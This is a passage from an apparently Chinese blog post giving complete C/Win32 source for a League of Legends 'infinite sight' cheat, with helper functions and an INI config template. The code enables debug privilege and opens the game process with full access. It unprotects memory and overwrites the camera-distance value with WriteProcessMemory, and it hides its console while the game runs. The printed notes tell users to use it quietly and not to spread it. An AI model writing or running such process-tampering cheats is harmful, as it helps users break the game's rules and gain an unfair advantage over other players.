class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="preprocessor">#<span class="keyword">include</span> <span class="string">"stdafx.h"</span></span></span><br><span class="line"><span class="preprocessor">#<span class="keyword">include</span> <span class="string">"SightFunc.h"</span></span></span><br><span class="line"><span class="keyword">extern</span> <span class="string">"C"</span> <span class="function">WINBASEAPI HWND WINAPI <span class="title">GetConsoleWindow</span> <span class="params">()</span></span>;</span><br><span class="line"><span class="comment">/*</span><br><span class="line">#define oldSightValue 0x450CA000  //2250</span><br><span class="line">#define newSightValue 0x457A0000  //4000</span><br><span class="line">#define newSightValue 0x453B8000  //3000   </span><br><span class="line">#define newSightValue 0x458B1000  //4450   </span><br><span class="line">*/</span></span><br><span class="line"><span class="keyword">int</span> _tmain(<span class="keyword">int</span> argc, _TCHAR* argv[])</span><br><span class="line">&#123;</span><br><span class="line">	WinInit();</span><br><span class="line">	<span class="keyword">int</span> flag = <span class="number">0</span>;</span><br><span class="line">	BOOL isNewSight = FALSE;</span><br><span class="line">	DWORD dwProcId = <span class="number">0</span>;</span><br><span class="line">	HANDLE hProcess = <span class="literal">NULL</span>;</span><br><span class="line">	BYTE *pTagModBaseAddr = <span class="literal">NULL</span>;</span><br><span class="line">	<span class="comment">// 如果已有互斥量存在则释放句柄并复位互斥量</span></span><br><span class="line">	HANDLE m_hMutex = CreateMutexW(<span class="literal">NULL</span>, FALSE, <span class="string">L"idhyt"</span>);</span><br><span class="line">	<span class="keyword">if</span> (ERROR_ALREADY_EXISTS == GetLastError())</span><br><span class="line">	&#123;</span><br><span class="line">		wprintf(<span class="string">L"The Program has been running! ErrorCode: %d\n"</span>, GetLastError());</span><br><span class="line">		<span class="keyword">goto</span> gleave;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="comment">//L"SeDebugPrivilege"</span></span><br><span class="line">	EnablePrivilege(SE_DEBUG_NAME, TRUE);</span><br><span class="line">	dwProcId = GetProcessIdByName(<span class="string">L"League of Legends.exe"</span>);</span><br><span class="line">	<span class="keyword">if</span> (<span class="number">0</span> == dwProcId)</span><br><span class="line">	&#123;</span><br><span class="line">		wprintf(<span class="string">L"Get ProcessID error! ErrorCode: %d\n"</span>, GetLastError());</span><br><span class="line">		<span class="built_in">printf</span>(<span class="string">"选择完英雄，进入读条状态时再启用!\n\n"</span>);</span><br><span class="line">		<span class="keyword">goto</span> gleave;</span><br><span class="line">	&#125;</span><br><span class="line">	hProcess = OpenProcess(PROCESS_ALL_ACCESS,FALSE,dwProcId);</span><br><span class="line">	<span class="keyword">if</span> (<span class="literal">NULL</span> == hProcess)</span><br><span class="line">	&#123;</span><br><span class="line">		wprintf(<span class="string">L"Get ProcessHandle error! ErrorCode: %d\n"</span>, GetLastError());</span><br><span class="line">		<span class="keyword">goto</span> gleave;</span><br><span class="line">	&#125;</span><br><span class="line">	pTagModBaseAddr = GetProcessModBaseAddr(<span class="string">L"League of Legends.exe"</span>, dwProcId);</span><br><span class="line">	<span class="keyword">if</span> (<span class="literal">NULL</span> == pTagModBaseAddr)</span><br><span class="line">	&#123;</span><br><span class="line">		wprintf(<span class="string">L"Get pTagModBaseAddr error! ErrorCode: %d\n"</span>, GetLastError());</span><br><span class="line">		<span class="keyword">goto</span> gleave;</span><br><span class="line">	&#125;</span><br><span class="line">	PINI_ProfileInfor pIniProfileInfor = GetPrivateProfileInfor();</span><br><span class="line">	<span class="keyword">if</span> (pIniProfileInfor-&gt;bRet == TRUE)</span><br><span class="line">	&#123;</span><br><span class="line">		<span class="keyword">while</span> (<span class="literal">true</span>)</span><br><span class="line">		&#123;</span><br><span class="line">			Sleep(<span class="number">1000</span>);</span><br><span class="line">			dwProcId = <span class="number">0</span>;</span><br><span class="line">			hProcess = <span class="literal">NULL</span>;</span><br><span class="line">			pTagModBaseAddr = <span class="literal">NULL</span>;</span><br><span class="line">			isNewSight = FALSE;</span><br><span class="line">			dwProcId = GetProcessIdByName(<span class="string">L"League of Legends.exe"</span>);</span><br><span class="line">			<span class="keyword">if</span> (<span class="number">0</span> == dwProcId)</span><br><span class="line">			&#123;</span><br><span class="line">				<span class="keyword">if</span> (flag == <span class="number">0</span>)</span><br><span class="line">				&#123;</span><br><span class="line">					<span class="built_in">printf</span>(<span class="string">"等待进入游戏... ErrorCode: %d\n"</span>, GetLastError());</span><br><span class="line">				&#125;</span><br><span class="line">				flag ++ ;</span><br><span class="line">				<span class="keyword">continue</span>;</span><br><span class="line">			&#125;</span><br><span class="line">			hProcess = OpenProcess(PROCESS_ALL_ACCESS,FALSE,dwProcId);</span><br><span class="line">			<span class="keyword">if</span> (<span class="literal">NULL</span> == hProcess)</span><br><span class="line">			&#123;</span><br><span class="line">				wprintf(<span class="string">L"Get ProcessHandle error! ErrorCode: %d\n"</span>, GetLastError());</span><br><span class="line">				<span class="keyword">continue</span>;</span><br><span class="line">			&#125;</span><br><span class="line">			pTagModBaseAddr = GetProcessModBaseAddr(<span class="string">L"League of Legends.exe"</span>, dwProcId);</span><br><span class="line">			<span class="keyword">if</span> (<span class="literal">NULL</span> == pTagModBaseAddr)</span><br><span class="line">			&#123;</span><br><span class="line">				wprintf(<span class="string">L"Get pTagModBaseAddr error! ErrorCode: %d\n"</span>, GetLastError());</span><br><span class="line">				<span class="keyword">continue</span>;</span><br><span class="line">			&#125;</span><br><span class="line">			isNewSight = SetNewSight(hProcess, pTagModBaseAddr, pIniProfileInfor-&gt;newSight, pIniProfileInfor-&gt;oldSight, pIniProfileInfor-&gt;dwRVA);</span><br><span class="line">			<span class="keyword">if</span> (isNewSight == TRUE)</span><br><span class="line">			&#123;</span><br><span class="line">				wprintf(<span class="string">L"Chage Sight Success!\n"</span>);</span><br><span class="line">				Sleep(<span class="number">3000</span>);</span><br><span class="line">				ShowWindow(GetConsoleWindow(), SW_HIDE);</span><br><span class="line">			&#125;</span><br><span class="line">			<span class="keyword">else</span></span><br><span class="line">			&#123;</span><br><span class="line">				wprintf(<span class="string">L"Chage Sight False!\n"</span>);</span><br><span class="line">				<span class="keyword">continue</span>;</span><br><span class="line">			&#125;</span><br><span class="line">			<span class="keyword">while</span> (GetProcessIdByName(<span class="string">L"League of Legends.exe"</span>))</span><br><span class="line">			&#123;</span><br><span class="line">				Sleep(<span class="number">5000</span>);</span><br><span class="line">			&#125;</span><br><span class="line">			Sleep(<span class="number">3000</span>);</span><br><span class="line">			ShowWindow(GetConsoleWindow(), SW_SHOW);</span><br><span class="line">			flag = <span class="number">0</span>;</span><br><span class="line">			system(<span class="string">"cls"</span>);</span><br><span class="line">			<span class="built_in">printf</span>(<span class="string">"若继续使用无限视距功能,请勿关闭该窗口!\n"</span>);</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">gleave:</span><br><span class="line">	<span class="keyword">if</span> (hProcess)</span><br><span class="line">		CloseHandle(hProcess);</span><br><span class="line">	<span class="keyword">if</span> (m_hMutex)</span><br><span class="line">		CloseHandle(m_hMutex);</span><br><span class="line">	EnablePrivilege(SE_DEBUG_NAME, FALSE);  </span><br><span class="line">	system(<span class="string">"pause"</span>);</span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;	</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h3 id="用到的功能函数">用到的功能函数</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br><span class="line">238</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="comment">// SightFunc.cpp</span></span><br><span class="line"><span class="preprocessor">#<span class="keyword">include</span> <span class="string">"stdafx.h"</span></span></span><br><span class="line"><span class="preprocessor">#<span class="keyword">include</span> <span class="string">"SightFunc.h"</span></span></span><br><span class="line"></span><br><span class="line"><span class="function">DWORD WINAPI <span class="title">GetProcessIdByName</span><span class="params">(LPCTSTR lpFilename)</span></span><br><span class="line"></span>&#123;</span><br><span class="line">    HANDLE hProcessSnap = <span class="literal">NULL</span>; </span><br><span class="line">    DWORD dwProcessId = <span class="number">0</span>;</span><br><span class="line">    PROCESSENTRY32 pe32 = &#123;<span class="number">0</span>&#125;;</span><br><span class="line">    pe32.dwSize = <span class="keyword">sizeof</span>(PROCESSENTRY32); </span><br><span class="line">    hProcessSnap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS,<span class="number">0</span>);</span><br><span class="line">    <span class="keyword">if</span>(hProcessSnap == INVALID_HANDLE_VALUE) </span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">if</span>(!Process32First(hProcessSnap,&amp;pe32))</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">int</span> i = GetLastError();</span><br><span class="line">        CloseHandle(hProcessSnap);</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">do</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="number">0</span> == _wcsicmp(pe32.szExeFile,lpFilename))</span><br><span class="line">        &#123;</span><br><span class="line">            dwProcessId = pe32.th32ProcessID;</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">while</span>(Process32Next(hProcessSnap,&amp;pe32));</span><br><span class="line"></span><br><span class="line">    CloseHandle(hProcessSnap);</span><br><span class="line">    <span class="keyword">return</span> dwProcessId;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//返回进程指定模块基址</span></span><br><span class="line"><span class="function">BYTE *<span class="title">GetProcessModBaseAddr</span><span class="params">(LPCTSTR lpFilename, DWORD dwPID)</span> </span><br><span class="line"></span>&#123; </span><br><span class="line">    HANDLE hModuleSnap = INVALID_HANDLE_VALUE; </span><br><span class="line">    MODULEENTRY32 me32 = &#123;<span class="number">0</span>&#125;;</span><br><span class="line">    me32.dwSize = <span class="keyword">sizeof</span>( MODULEENTRY32 ); </span><br><span class="line">    BYTE *pModBaseAddr = <span class="literal">NULL</span>;</span><br><span class="line">    hModuleSnap = CreateToolhelp32Snapshot( TH32CS_SNAPMODULE, dwPID ); </span><br><span class="line">    <span class="keyword">if</span>(INVALID_HANDLE_VALUE == hModuleSnap) </span><br><span class="line">    &#123;</span><br><span class="line">        wprintf(<span class="string">L"CreateToolhelp32Snapshot (of modules %d) Error! ErrorCode: %d"</span>, dwPID, GetLastError());</span><br><span class="line">        <span class="keyword">goto</span> gleave;</span><br><span class="line">    &#125;    </span><br><span class="line">    </span><br><span class="line">    <span class="keyword">if</span>( Module32First( hModuleSnap, &amp;me32 )) </span><br><span class="line">    &#123; </span><br><span class="line">        <span class="keyword">do</span> </span><br><span class="line">        &#123; </span><br><span class="line">            <span class="keyword">if</span>(<span class="number">0</span> == _wcsicmp(me32.szModule,lpFilename))</span><br><span class="line">            &#123;</span><br><span class="line">                pModBaseAddr = me32.modBaseAddr;</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            </span><br><span class="line">        &#125; <span class="keyword">while</span>( Module32Next( hModuleSnap, &amp;me32 ) ); </span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    &#123; </span><br><span class="line">        wprintf(<span class="string">L"Module32First Error! ErrorCode: %d"</span>, GetLastError()); </span><br><span class="line">        <span class="keyword">goto</span> gleave;</span><br><span class="line">    &#125; </span><br><span class="line">gleave:</span><br><span class="line">    <span class="keyword">if</span> (hModuleSnap)</span><br><span class="line">        CloseHandle( hModuleSnap );</span><br><span class="line">    <span class="keyword">return</span> pModBaseAddr;</span><br><span class="line">&#125; </span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">/* </span><br><span class="line">功能:   是否开启Debug权限</span><br><span class="line">参数:   lpName:"SeDebugPrivilege"</span><br><span class="line">        fEnable:TRUE表示开启,反之禁用</span><br><span class="line">返回值: TRUE/FLASE</span><br><span class="line">SE_DEBUG_NAME SeDebugPrivilege</span><br><span class="line">*/</span></span><br><span class="line"><span class="function">BOOL <span class="title">EnablePrivilege</span><span class="params">(LPCTSTR lpszPrivilegeName, BOOL bEnable)</span></span><br><span class="line"></span>&#123;</span><br><span class="line">    HANDLE hToken;</span><br><span class="line">    TOKEN_PRIVILEGES tp = &#123;<span class="number">0</span>&#125;;</span><br><span class="line">    LUID luid = &#123;<span class="number">0</span>&#125;;</span><br><span class="line">    BOOL bRet = FALSE;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>(!OpenProcessToken(GetCurrentProcess(),</span><br><span class="line">        TOKEN_ADJUST_PRIVILEGES |</span><br><span class="line">        TOKEN_QUERY | TOKEN_READ,</span><br><span class="line">        &amp;hToken))</span><br><span class="line">    &#123;</span><br><span class="line">        bRet =FALSE;</span><br><span class="line">        <span class="keyword">goto</span> gleave;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span>(LookupPrivilegeValue(<span class="literal">NULL</span>, lpszPrivilegeName, &amp;luid))</span><br><span class="line">    &#123;</span><br><span class="line">        tp.PrivilegeCount = <span class="number">1</span>;</span><br><span class="line">        tp.Privileges[<span class="number">0</span>].Luid = luid;</span><br><span class="line">        tp.Privileges[<span class="number">0</span>].Attributes = (bEnable) ? SE_PRIVILEGE_ENABLED : <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">if</span> (AdjustTokenPrivileges(hToken,FALSE,&amp;tp,<span class="literal">NULL</span>,<span class="literal">NULL</span>,<span class="literal">NULL</span>))</span><br><span class="line">        &#123;</span><br><span class="line">            bRet = TRUE;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">gleave:</span><br><span class="line">    <span class="keyword">if</span> (hToken)</span><br><span class="line">        CloseHandle(hToken);</span><br><span class="line">    <span class="keyword">return</span> bRet;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function">VOID <span class="title">WinInit</span><span class="params">()</span></span><br><span class="line"></span>&#123;</span><br><span class="line">    system(<span class="string">"color 02 &amp; title 英雄联盟无限视距修改器"</span>);</span><br><span class="line">    <span class="keyword">time_t</span> timer; </span><br><span class="line">    time(&amp;timer); </span><br><span class="line">    <span class="keyword">struct</span> tm newtime;</span><br><span class="line">    localtime_s(&amp;newtime, &amp;timer); </span><br><span class="line">    <span class="comment">//wprintf(L"***********************************\n");</span></span><br><span class="line">    wprintf(<span class="string">L"%d.%d.%d"</span>, newtime.tm_year+<span class="number">1900</span>, newtime.tm_mon+<span class="number">1</span>, newtime.tm_mday);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"--&gt; 右键-&gt;管理员身份运行,请低调使用!\n"</span>);</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">"--&gt; 默认视距4000,修改说明:Infinite Sight.ini\n"</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"--&gt; 选完英雄,进入游戏读条界面以后使用!\n"</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"--&gt; 勿传播,勿做非法用途!!! \n"</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"                Date 2014.08.25 \n\n"</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"--------------------------------------\n\n"</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//获取配置文件信息</span></span><br><span class="line"><span class="function">PINI_ProfileInfor <span class="title">GetPrivateProfileInfor</span><span class="params">()</span></span><br><span class="line"></span>&#123;</span><br><span class="line">	DWORD bRet = <span class="number">0</span>;</span><br><span class="line">	PINI_ProfileInfor pIniProfileInfor = <span class="keyword">new</span> INI_ProfileInfor;</span><br><span class="line">	<span class="built_in">memset</span>(pIniProfileInfor, <span class="number">0</span>, <span class="keyword">sizeof</span>(INI_ProfileInfor));</span><br><span class="line">	WCHAR strPath[MAX_PATH] = &#123;<span class="number">0</span>&#125;;</span><br><span class="line">	WCHAR strIniPath[MAX_PATH] = &#123;<span class="number">0</span>&#125;;</span><br><span class="line">	DWORD newSight = <span class="number">0</span>;</span><br><span class="line">	DWORD oldSight = <span class="number">0</span>;</span><br><span class="line">	DWORD dwRVA = <span class="number">0</span>;</span><br><span class="line">	bRet = GetCurrentDirectoryW(MAX_PATH,strPath);</span><br><span class="line">	<span class="keyword">if</span> (bRet &gt; MAX_PATH)</span><br><span class="line">	&#123;</span><br><span class="line">		pIniProfileInfor-&gt;bRet = FALSE;</span><br><span class="line">		wprintf(<span class="string">L"GetCurrentDirectory Error! ErrorCode: %d\n"</span>, GetLastError());</span><br><span class="line">		<span class="keyword">goto</span> gleave;</span><br><span class="line">	&#125;</span><br><span class="line">	swprintf_s(strIniPath, MAX_PATH, <span class="string">L"%s%s"</span>, strPath, <span class="string">L"\\Infinite Sight.ini"</span>);</span><br><span class="line"></span><br><span class="line">	newSight = GetPrivateProfileInt(<span class="string">L"New Sight"</span>, <span class="string">L"newSight"</span>, <span class="number">0</span>, strIniPath);</span><br><span class="line">	<span class="keyword">if</span> (<span class="number">2250</span> &gt; newSight || <span class="number">4000</span> &lt; newSight)</span><br><span class="line">	&#123;</span><br><span class="line">		pIniProfileInfor-&gt;bRet = FALSE;</span><br><span class="line">		wprintf(<span class="string">L"The newSight Value Error!\n"</span>);</span><br><span class="line">		<span class="keyword">goto</span> gleave;</span><br><span class="line">	&#125;</span><br><span class="line">	oldSight = GetPrivateProfileInt(<span class="string">L"Old Sight"</span>, <span class="string">L"oldSight"</span>, <span class="number">0</span>, strIniPath);</span><br><span class="line">	<span class="keyword">if</span> (<span class="number">2250</span> != oldSight)</span><br><span class="line">	&#123;</span><br><span class="line">		pIniProfileInfor-&gt;bRet = FALSE;</span><br><span class="line">		wprintf(<span class="string">L"The oldSight Value Error!\n"</span>);</span><br><span class="line">		<span class="keyword">goto</span> gleave;</span><br><span class="line">	&#125;</span><br><span class="line">	dwRVA = GetPrivateProfileInt(<span class="string">L"Error"</span>, <span class="string">L"Value"</span>, <span class="number">0</span>, strIniPath);</span><br><span class="line">	<span class="keyword">if</span> (<span class="number">0</span> == dwRVA)</span><br><span class="line">	&#123;</span><br><span class="line">		pIniProfileInfor-&gt;bRet = FALSE;</span><br><span class="line">		wprintf(<span class="string">L"The dwRVA Value Error!\n"</span>);</span><br><span class="line">		<span class="keyword">goto</span> gleave;</span><br><span class="line">	&#125;</span><br><span class="line">	pIniProfileInfor-&gt;newSight = float2hex(newSight);</span><br><span class="line">	pIniProfileInfor-&gt;oldSight = float2hex(oldSight);</span><br><span class="line">	pIniProfileInfor-&gt;dwRVA = dwRVA;</span><br><span class="line">	pIniProfileInfor-&gt;bRet = TRUE;</span><br><span class="line">gleave:</span><br><span class="line">	<span class="keyword">return</span> pIniProfileInfor;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function">DWORD <span class="title">float2hex</span><span class="params">(<span class="keyword">float</span> f)</span></span><br><span class="line"></span>&#123;</span><br><span class="line">	DWORD h = <span class="number">0</span>;</span><br><span class="line">	<span class="keyword">char</span> *pf = (<span class="keyword">char</span>*)&amp;f;</span><br><span class="line">	<span class="keyword">if</span> (pf)</span><br><span class="line">	&#123;</span><br><span class="line">		h = *(DWORD *)pf;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">return</span> h;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function">BOOL <span class="title">SetNewSight</span><span class="params">(HANDLE hProcess, BYTE *pTagModBaseAddr, DWORD newSightValue, DWORD oldSightValue, DWORD dwRVA)</span></span><br><span class="line"></span>&#123;</span><br><span class="line"></span><br><span class="line">	BOOL bRet = FALSE;</span><br><span class="line">	BOOL isNewSight = FALSE;</span><br><span class="line">	DWORD dwSight = <span class="number">0</span>;</span><br><span class="line">	DWORD dwRead = <span class="number">0</span>;</span><br><span class="line">	DWORD dwNewSight = <span class="number">0</span>;</span><br><span class="line">	DWORD dwWrite = <span class="number">0</span>;</span><br><span class="line">	DWORD dwOldProtect = <span class="number">0</span>;</span><br><span class="line">	DWORD dwInitProtect = <span class="number">0</span>;</span><br><span class="line">	pTagModBaseAddr = pTagModBaseAddr + dwRVA;</span><br><span class="line">	bRet = VirtualProtectEx(hProcess, pTagModBaseAddr, <span class="number">0x4</span>, <span class="number">0x40</span>, &amp;dwInitProtect); <span class="comment">//PAGE_EXECUTE_READWRITE </span></span><br><span class="line">	<span class="keyword">if</span> (!bRet)</span><br><span class="line">	&#123;</span><br><span class="line">		wprintf(<span class="string">L"Change PAGA_attribute error! ErrorCode: %d\n"</span>, GetLastError());</span><br><span class="line">		<span class="keyword">goto</span> gleave;</span><br><span class="line">	&#125;	</span><br><span class="line">	bRet = ReadProcessMemory(hProcess, pTagModBaseAddr, &amp;dwSight, <span class="number">4</span>, &amp;dwRead);</span><br><span class="line">	<span class="keyword">if</span> (!bRet)</span><br><span class="line">	&#123;</span><br><span class="line">		wprintf(<span class="string">L"ReadProcessMemory error! ErrorCode: %d\n"</span>, GetLastError());</span><br><span class="line">		<span class="keyword">goto</span> gleave;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">if</span> (oldSightValue == dwSight &amp;&amp; <span class="number">4</span> == dwRead)</span><br><span class="line">	&#123;</span><br><span class="line">		dwNewSight = newSightValue;</span><br><span class="line">		bRet = WriteProcessMemory(hProcess, pTagModBaseAddr, &amp;dwNewSight, <span class="number">4</span>, &amp;dwWrite);</span><br><span class="line">		<span class="keyword">if</span> (!bRet)</span><br><span class="line">		&#123;</span><br><span class="line">			wprintf(<span class="string">L"WriteProcessMemory error! ErrorCode: %d\n"</span>, GetLastError());</span><br><span class="line">			<span class="keyword">goto</span> gleave;</span><br><span class="line">		&#125;</span><br><span class="line">		isNewSight = TRUE;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">else</span></span><br><span class="line">	&#123;</span><br><span class="line">		isNewSight = FALSE;</span><br><span class="line">		wprintf(<span class="string">L"The Sight Value not found!\n"</span>);</span><br><span class="line">	&#125;    </span><br><span class="line"></span><br><span class="line">	bRet = VirtualProtectEx(hProcess, pTagModBaseAddr, <span class="number">0x4</span>, dwInitProtect, &amp;dwOldProtect); <span class="comment">//0x40 PAGE_EXECUTE_READWRITE </span></span><br><span class="line">	<span class="keyword">if</span> (!bRet)</span><br><span class="line">	&#123;</span><br><span class="line">		wprintf(<span class="string">L"Resume PAGA_attribute error! ErrorCode: %d\n"</span>, GetLastError());</span><br><span class="line">	&#125;</span><br><span class="line">gleave:</span><br><span class="line">	<span class="keyword">return</span> isNewSight;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h3 id="配置文件模版">配置文件模版</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">[说明]</span><br><span class="line">文件名为：Infinite Sight.ini</span><br><span class="line">默认视距为最大值<span class="number">4000</span>，如需修改视距，改变<span class="keyword">new</span> Sight值即可，如<span class="number">3000</span>视距改为<span class="keyword">new</span> Sight = <span class="number">3000</span>，修改值必须在<span class="number">2250</span>-<span class="number">4000</span>之间!</span><br><span class="line">请勿移动本配置文件，需和Infinite Sight.exe在同目录下。</span><br><span class="line">此插件为个人使用，请勿非法传播 :)</span><br><span class="line"></span><br><span class="line">[New Sight]</span><br><span class="line">newSight = <span class="number">4000</span></span><br><span class="line"></span><br><span class="line">[Old Sight]</span><br><span class="line">oldSight = <span class="number">2250</span></span><br></pre></td></tr></table></figure>

      
    </div>
